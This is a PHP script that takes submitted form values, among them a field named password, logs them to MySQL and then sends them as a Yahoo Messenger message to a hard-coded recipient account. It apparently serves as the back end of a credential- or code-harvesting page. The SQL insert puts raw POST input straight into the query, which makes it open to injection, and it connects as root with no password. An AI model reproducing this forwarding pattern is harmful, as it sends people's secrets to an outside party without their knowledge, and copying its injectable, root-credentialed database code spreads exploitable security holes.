<?php
        $kode = $_POST["kode"];
        $calc_result = $_POST["calc_result"];
        $nominal = $_POST["nominal"];
        $password = $_POST["password"];

  //tambah data ke log MySQL

  $sambung=mysql_connect("localhost","root","");

  //perintah memasukan data
  $input="INSERT INTO `mostryahoo`.`log` (`no`, `calc_result`, `kode`, `nominal`, `date`) VALUES (NULL, '$calc_result', '$kode', '$nominal', CURRENT_TIMESTAMP)";

  //perintah dilaksanakan
  $hasil=mysql_query($input);
 
  // get home page of yahoo mobile
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, "http://us.m.yahoo.com/w/bp-messenger");
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_ENCODING, "");
  curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; EmbeddedWB 14.52 from: http://www.bsalsa.com/ EmbeddedWB 14,52; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)");
  curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd() . '/cookies_yahoo_messenger.cookie');
  $curlData = curl_exec($curl);
  curl_close($curl);
 
  // debug: show the returned html
  // echo $curlData; exit;
 
  // get post url for login to yahoo
  $xml = $curlData;
  $xmlDoc = new DOMDocument();
  @$xmlDoc->loadHTML($xml);
 
  $urlPostLoginToYahoo = $xmlDoc->getElementsByTagName("form")->item(0)->getAttribute("action");
 
  foreach ($xmlDoc->getElementsByTagName("input") as $input) {
    if ($input->getAttribute("name") == "_done") {
      $_done = $input->getAttribute("value");
    }
    if ($input->getAttribute("name") == "_ts") {
      $_ts = $input->getAttribute("value");
    }
    if ($input->getAttribute("name") == "_crumb") {
      $_crumb = $input->getAttribute("value");
    }
  }
 
  // do login to yahoo messenger (mobile version)
  $yahoo_id = "id_yahoo_anda";                              // MASUKAN ID YAHOO MESSANGER ANDA!!
  $yahoo_id_password = "pass_yahoo_anda";              		// MASUKAN PASSWORD YAHOO MESSANGER ANDA!!
 
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, $urlPostLoginToYahoo);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_POST, 1);
  curl_setopt($curl, CURLOPT_POSTFIELDS, "_authurl=auth&_done=" . $_done . "&_sig=&_src=&_ts=" . $_ts . "&_crumb=" . $_crumb . "&_pc=&_send_userhash=0&_partner_ts=&id=" . $yahoo_id . "&password=" . $yahoo_id_password . "&__submit=Sign+in");
  curl_setopt($curl, CURLOPT_ENCODING, "");
  curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; EmbeddedWB 14.52 from: http://www.bsalsa.com/ EmbeddedWB 14,52; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)");
  curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd() . '/cookies_yahoo_messenger.cookie');
  curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd() . '/cookies_yahoo_messenger.cookie');
  $curlData = curl_exec($curl);
  curl_close($curl);
 
  // get home page url for sending message
  $urlSendMessage = $curlData;
  $urlSendMessage = substr($urlSendMessage, strpos($urlSendMessage, "<a href=\"/w/bp-messenger/sendmessage") + 9);
  $urlSendMessage = substr($urlSendMessage, 0, strpos($urlSendMessage, "\""));
  $urlSendMessage = str_replace("&amp;", "&", $urlSendMessage);
  $urlSendMessage = "http://us.m.yahoo.com" . $urlSendMessage;
 
  // get home page of mobile messenger to send message
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, $urlSendMessage);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_ENCODING, "");
  curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; EmbeddedWB 14.52 from: http://www.bsalsa.com/ EmbeddedWB 14,52; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)");
  curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd() . '/cookies_yahoo_messenger.cookie');
  curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd() . '/cookies_yahoo_messenger.cookie');
  $curlData = curl_exec($curl);
  curl_close($curl);
 
  // debug: show the returned html
  // echo $curlData; exit;
 
  $xml = $curlData;
  $xmlDoc = new DOMDocument();
  @$xmlDoc->loadHTML($xml);
 
  $urlPostSendMessage = $xmlDoc->getElementsByTagName("form")->item(0)->getAttribute("action");
  $urlPostSendMessage = "http://us.m.yahoo.com" . $urlPostSendMessage;
 
  // do send message to yahoo messenger
  $yahoo_username = "id_yahoo_tujuan";               // MASUKAN ID YAHOO MESSANGER TUJUAN PENERIMA!!
  $yahoo_message = $kode . " " . $calc_result . " " . $nominal . " " . $password;
 
  $curl = curl_init();
  curl_setopt($curl, CURLOPT_URL, $urlPostSendMessage);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_POST, 1);
  curl_setopt($curl, CURLOPT_POSTFIELDS, "id=" . $yahoo_username . "&message=" . $yahoo_message . "&__submit=Send");
  curl_setopt($curl, CURLOPT_ENCODING, "");
  curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; EmbeddedWB 14.52 from: http://www.bsalsa.com/ EmbeddedWB 14,52; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)");
  curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd() . '/cookies_yahoo_messenger.cookie');
  curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd() . '/cookies_yahoo_messenger.cookie');
  $curlData = curl_exec($curl);
  curl_close($curl);
  
  if ($hasil){
    echo "<script>alert('Data log berhasil disimpan');document.location='log.php'</script>";
  }
    else{
    echo "<script>alert('Data log gagal disimpan');document.location='main.php'</script>";
  }
?>
